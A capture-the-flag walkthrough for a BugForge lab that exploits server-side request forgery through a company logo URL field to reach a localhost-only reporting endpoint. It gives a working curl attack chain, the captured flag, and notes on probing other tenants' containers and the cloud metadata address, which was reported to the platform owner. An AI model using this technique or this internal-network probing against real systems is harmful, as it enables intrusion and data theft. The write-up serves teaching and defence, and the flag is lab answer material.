# FurHire-008 - BugForge Lab Walkthrough

**URL:** https://lab-1781046588394-zw3s4u.labs-app.bugforge.io/
**Difficulty:** Medium  
**Vulnerability:** SSRF - Server-Side Request Forgery via logo_url field
**Flag:** `bug{XMNgy9hE7MO1iYIOIDA0QFgm8UB2t78B}`

---

## Summary

FurHire-008 is a job board SPA. Recruiters can attach a company logo via a URL field (`logo_url`). The server fetches the URL server-side when a client requests `GET /api/company/:id/logo`. There is an internal reporting endpoint (`/reporting`) that is IP-gated to localhost only. Setting `logo_url` to `http://localhost:3000/reporting` causes the server to fetch that endpoint from its own loopback interface, bypassing the IP restriction and returning the flag alongside the jobs data.

## Tech Stack

- Frontend: React SPA (source maps exposed)
- Backend: Node.js / Express
- Auth: JWT (HS256)
- Internal endpoint: `/reporting` (localhost-only, returns analytics + flag)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `GET /health` | None | `{"status":"OK","message":"FurHire server is running"}` |
| `PUT /api/company` | JWT | Accepts `logo_url` field - stored as-is, no SSRF filter |
| `GET /api/company/:id/logo` | JWT | Server fetches `logo_url` and returns response body |
| `GET /reporting` | IP-gated (localhost only) | Returns jobs data + flag; 403 from external IPs |

## Attack Chain

**Step 1 - Register and get JWT**
```bash
curl -s -k -X POST $TARGET/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Password123!","email":"attacker@evil.com","role":"recruiter"}'
# Save TOKEN from response
```

**Step 2 - Set logo_url to the internal reporting endpoint**
```bash
curl -s -k -X PUT $TARGET/api/company \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"company_name":"TestCorp","industry":"Tech","description":"test",
       "location":"London","website":"http://example.com",
       "logo_url":"http://localhost:3000/reporting"}'
# {"message":"Company updated successfully"}
```

**Step 3 - Trigger the server-side fetch**
```bash
curl -s -k $TARGET/api/company/3/logo \
  -H "Authorization: Bearer $TOKEN"
# Returns jobs + flag: {"jobs":[...],"applications":[...],"flag":"bug{...}"}
```

## Discovery Notes

- Source maps exposed at `/static/js/main.*.js.map` - found `logo_url` field in company profile component
- HTML template for company cards showed `<img src="/api/company/${id}/logo">` - identified the fetch trigger
- Port scan of localhost confirmed only port 3000 open (the app itself)
- Checked `/reporting` directly from the internet → 403 "Access denied"
- `/reporting` from inside the container (via SSRF on localhost) → 200 with full data + flag

## Cross-Container Discovery (Bonus Finding)

During SSRF testing, probing the Docker network revealed:
- **172.17.0.1** - Docker host gateway, serving HTTP (301 on port 80, 404 page not found on port 443 via plain HTTP). Likely Traefik reverse proxy; dashboard not accessible (port 8080 connection refused).
- **172.18.0.4-6** - Live lab containers belonging to other BugForge users, reachable from inside our container via the `labs_internal` Docker network.
- `172.18.0.5:3000/api/company/3/logo` is accessible **without authentication** - another user's SSRF trigger can be called cross-tenant.
- `172.18.0.5:3000/reporting` → 403 from cross-container IP (correctly rejected), but 172.18.0.4 had `/api/flag` → 401.

**Architecture implication**: BugForge labs share a flat `labs_internal` Docker network. There is no per-container firewall. Any lab can reach any other lab via internal IPs. If a lab's SSRF trigger is unauthenticated, a cross-tenant SSRF chain is possible in principle (set victim's logo_url → trigger their fetch from our container). This was raised with the BugForge platform owner.

## Dead Ends

| Tried | Why It Failed | Lesson |
|---|---|---|
| `localhost:8080` | 502 - Traefik not on localhost, runs on Docker host | SSRF targets inside the container only; Traefik is external |
| `172.17.0.1:8080` | 502 - Traefik dashboard port not listening | Dashboard disabled or bound to 127.0.0.1 on host |
| `169.254.169.254` (IMDS) | 401 XHTML - IMDS protected, likely blocked or IMDSv2 required | Can't do PUT for IMDSv2 token via GET-only SSRF |
| `172.17.0.x:3000` | 504 - containers not on this subnet | Labs on 172.18.0.0/16, not 172.17.0.0/16 |
| Port scan localhost (80, 443, 8080, 9090, 2019) | 502 - all connection refused | Only port 3000 is open inside the container |

## Root Causes

1. `logo_url` is accepted and stored from the client without any SSRF filter or allowlist.
2. The server-side fetch uses the full URL as provided, including `http://localhost/...` loopback addresses.
3. `/reporting` relies solely on IP source filtering for access control - internal service isolation is the only guard.
4. No Content-Type validation on the logo response - the server returns whatever the fetched URL returns, leaking arbitrary internal data.

## CWE / OWASP

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-441: Unintended Proxy or Intermediary
- OWASP A10:2021 - Server-Side Request Forgery
